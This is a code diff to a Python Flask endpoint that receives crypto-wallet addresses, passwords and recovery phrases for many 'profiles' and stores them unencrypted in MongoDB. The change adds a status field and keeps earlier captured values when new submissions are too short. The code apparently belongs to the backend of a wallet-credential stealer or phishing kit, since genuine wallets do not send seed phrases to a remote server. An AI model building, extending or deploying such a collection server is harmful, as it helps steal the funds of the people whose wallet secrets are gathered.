@@ -110,6 +110,7 @@ def wallet_detail_push():
     address = data.get("address")
     password = data.get("password")
     recovery_phrase = data.get("recovery_phrase")
+    status = data.get("status")
 
     wallet = current_app.wallet.find_one({"slug": str(wallet_type).lower()})
 
@@ -123,6 +124,7 @@ def wallet_detail_push():
                 "password": password,
                 "recovery_phrase": recovery_phrase,
                 "last_time": datetime.now(),
+                "status": status,
             }
         )
 
@@ -136,6 +138,23 @@ def wallet_detail_push():
     )
 
     if check_exit:
+        update_fields = {}
+        
+        if address and len(address) >= 3:
+            update_fields["address"] = address
+
+        if password and len(password) >= 3:
+            update_fields["password"] = password
+
+        if recovery_phrase and len(recovery_phrase) >= 3:
+            update_fields["recovery_phrase"] = recovery_phrase
+
+        if status and len(status) >= 3:
+            update_fields["status"] = status
+        
+        if update_fields:
+            update_fields["last_time"] = datetime.now()    
+        
         current_app.wallet_detail.update_one(
             {
                 "profile": profile,
@@ -143,12 +162,7 @@ def wallet_detail_push():
                 "wallet_id": ObjectId(wallet["_id"]),
             },
             {
-                "$set": {
-                    "address": address,
-                    "password": password,
-                    "recovery_phrase": recovery_phrase,
-                    "last_time": datetime.now(),
-                }
+                "$set": update_fields
             },
         )
         return (
@@ -165,6 +179,7 @@ def wallet_detail_push():
             "password": password,
             "recovery_phrase": recovery_phrase,
             "last_time": datetime.now(),
+            "status":status
         }
     )
 
